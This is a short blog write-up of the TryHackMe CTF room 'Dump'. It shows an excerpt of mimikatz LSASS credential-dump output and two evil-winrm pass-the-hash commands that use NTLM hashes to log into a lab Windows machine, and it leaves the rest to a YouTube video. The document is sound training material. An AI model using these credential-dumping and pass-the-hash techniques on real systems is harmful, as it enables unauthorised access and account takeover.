---
title: TryHackMe Dump Hackfinity Battle Write-Up Walk Through
date: 2025-03-25 06:00:00 +0200
categories: [TryHackMe, CTF,Hackfinity Battle, TryHackMe Write Up]
tags: [dump, evil-winrm, icacls, LSASS, mimikatz, Hackfinity, ctf]
description: "We breached Cipher's machine, uncovering encrypted plans and compromised systems, but he detected us and locked us out. Just before losing access, we dumped the LSASS process, capturing critical credentials. Now, with the dump in hand, we have one last chance to infiltrate his network and stop his next attack before it’s too late."
comments: false
media_subpath: /assets/img/
image:
  path: tryhackme-dump.png
  alt: TryHackMe Dump Hackfinity Battle
---

# Exploring TryHackMe's Dump: mimikatz LSASS dump

We tackle the TryHackMe room `Dump` from the Hackfinity Battle Encore CTF. We will analyses a given dump file contain `mimikatz LSASS dump`, extracted all relevant users with their `NTLM hashes`, then use `evil-winrm` to connect to the windows machine. We need to find which user has full access to administrator Desktop so we can read the `flag.txt` file

**[You can follow YouTube video walk through here](https://youtu.be/I92EmAhoEc0)**

## LSASS dump

We been given full mimikatz LSASS dump, below part of it:

```console
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 5056238 (00000000:004d26ee)
Session           : Interactive from 9
User Name         : DWM-9
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/3/2025 8:48:25 PM
SID               : S-1-5-90-0-9
        msv :
        tspkg :
        wdigest :
         * Username : DUMP$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

```
## evil-winrm / NTLM hash

Our next step is try to connect to windows machine using each user we have with `evil-winrm` and their corresponding `NTLM hash`

```console
evil-winrm -i 10.10.144.106 -u Administrator -H 2dfe3378335d43f9764e581b856a662a
evil-winrm -i 10.10.144.106 -u ByteReaper -H 43034346035d7a24b1eaa1c82acaef3e

```

We will find one of user has special permission to the `Administrator` files.

# Want the Full Walkthrough?

Check out my **[full video walkthrough](https://youtu.be/I92EmAhoEc0)** on my YouTube channel for step-by-step guidance:

**[You can follow YouTube video walk through here](https://youtu.be/I92EmAhoEc0)**

<img src="tryhackme-dump-youtube.png"  alt="TryHackMe Dump YouTube Video Walk through" >


